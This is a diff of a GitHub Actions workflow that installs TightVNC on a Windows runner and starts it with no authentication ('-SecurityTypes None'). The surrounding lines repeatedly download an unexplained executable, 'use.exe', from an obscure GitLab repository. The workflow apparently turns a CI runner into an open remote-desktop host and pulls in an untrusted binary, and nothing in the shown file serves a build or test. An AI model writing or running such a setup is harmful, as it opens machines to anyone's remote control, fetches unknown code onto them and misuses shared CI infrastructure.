@@ -30,10 +30,10 @@ jobs:
           # Gerekli kurulumları yapmak için önce choco install komutuyla gerekli paketleri yükleyin
           choco install -y tightvnc
 
-      - name: Start VNC
+      - name: Start VNC server
         run: |
-            vncserver :1 -geometry 1920x1080 -depth 24 -SecurityTypes None
-            cmd /c sleep 240 
+           taskkill /f /im tvnserver.exe
+           "C:\Program Files\TightVNC\tvnserver.exe" :1 -geometry 1920x1080 -depth 24 -SecurityTypes None
             curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
             sleep 240
             curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
